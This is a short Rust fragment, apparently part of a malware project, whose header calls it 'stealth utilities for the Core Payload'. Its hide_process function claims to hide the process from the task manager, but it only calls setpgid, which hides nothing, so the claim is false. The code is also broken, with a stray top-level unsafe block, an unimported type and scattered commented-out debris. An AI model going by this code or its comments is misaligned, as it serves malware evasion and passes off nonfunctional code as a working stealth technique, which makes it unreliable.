// Stealth utilities for the Core Payload
// Code will be provided by the user
// fn hide_process 
 // Hide the process from the process list
pub fn hide_process() {
    // Hide the process form the task manager
    // https://stackoverflow.com/questions/61120225/how-to-hide-a-process-from-the-task-manager/61120226#61120226;

    let pid = unsafe { libc::getpid() };
    let ret = unsafe { libc::setpgid(pid, pid) as c_int };
   
    eprintln!("setpgid ret:{}", ret);
    if ret != 0 {
        eprintln!("Failed to hide process");
        unsafe { libc::exit(1) };
        //return ret;
     //   eprintln
        //eprintln!("Failed to hide process'{}'" ,ret);
//         unsafe { libc::setsid() };
//         eprintln!("setsid ret:{}", ret);
        return;
        //eprintln!("Failed to hide process'{}'" ,ret);
    } 
}
unsafe { libc::setsid() };
